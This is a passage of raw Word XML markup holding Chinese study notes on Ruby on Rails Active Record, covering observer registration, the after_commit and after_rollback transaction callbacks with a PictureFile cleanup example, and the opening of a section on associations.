                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>observe</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :</w:t>
            </w:r>
            <w:r w:rsidRPr="00693BD5">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>registration</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>, :</w:t>
            </w:r>
            <w:r w:rsidRPr="00693BD5">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A05EDC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007F39D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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00693BD5">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_create</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>(model)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BDACB7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 code to send confirmation email...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03BB7BD5"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4A8A47D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2827109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本例中，当 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Registration</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被创建后，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_create</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法便会被调用。需要注意的是，这个新建的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>MailerObserver</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 需要在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中注册后才能生效：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="709EAAD4" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7DB4309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xml:space="preserve"># 注册激活后的观察者会一直运行下去。 </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04BA0D58"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config.active_record.observers = :</w:t>
            </w:r>
            <w:r w:rsidRPr="005522A2">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>mailer_observer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="120C7A42" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>19 事务回调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BAF78B"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还有两个回调是在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE1676">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>完成一次数据库事务操作后被触发</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE1676">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_commit</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE1676">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_rollback</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这两个回调和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_save</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 很相似，只不过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE1676">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>他们直到数据库操做成功完成或者失败后回滚完成后才被触发</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE1676">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>当你的 AR 模型需要和不属于数据库事务的外部系统打交道时会非常的有用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B74080"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考虑如下场景，前面的示例中 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PictureFile</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型需要在被销毁时删除和他关联的图片文件。如果在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调之后发生任何异常，事务回滚，但是图片文件已经被删除而且无法恢复，这就会导致模型数据不一致。例如，假设下面代码中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>picture_file_2</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是无效的，当我们执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>save!</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法时会抛出错误。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3336"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="00703426" w14:paraId="0343319E" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F324066"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PictureFile.transaction do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35DD50FD"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picture_file_1.destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0678BBC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picture_file_2.save!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60C867C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43D31D77"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2A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">我们可以在这种情况下使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_commit</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="27847EF1" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="151E3860"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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>PictureFile &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="436572B2"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attr_accessor :delete_file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25EDFCD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360AA13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703426">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_destroy</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|picture_file|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50D6DF1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picture_file.delete_file = picture_file.filepath</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E3A679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01A45EE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szCs w:val="24"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19D977FF"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w:t>
            </w:r>
            <w:r w:rsidRPr="00703426">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_commit</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|picture_file|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46DD2E5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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>picture_file.delete_file &amp;&amp; File.exist?(picture_file.delete_file)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E4736CE"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File.delete(picture_file.delete_file)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D0E3661"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picture_file.delete_file = nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25491443"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7F9B0CE7"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  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A4AED74" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2106AA83" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00703426">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>当模型在一个事务中被创建，更新或者销毁时，</w:t>
      </w:r>
      <w:r w:rsidRPr="00703426">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_commit</w:t>
      </w:r>
      <w:r w:rsidRPr="00703426">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="00703426">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_rollback</w:t>
      </w:r>
      <w:r w:rsidRPr="00703426">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调被确保会被调用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00703426">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>如果这些回调中的任何一个抛出异常，他们会被忽略并且不会干涉其它的回调</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。所以，</w:t>
      </w:r>
      <w:r w:rsidRPr="00703426">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>如果你的回调代码中可能抛出异常，你就需要在回调中捕获并适当的处理它</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C81798" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="005D6D6E"/>
    <w:p w14:paraId="723DD7F1" w14:textId="4500C1BD" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2.3、</w:t>
      </w:r>
      <w:hyperlink r:id="rId205" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Active Record 数据表关联</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49921B75" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009012A1">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>A Guide to Active Record Associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0534285B" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>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This guide covers the association features of Active Record. By referring to this guide, you will be able to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFCDE29" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>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Declare associations between Active Record models</w:t>
      </w:r>
    </w:p>
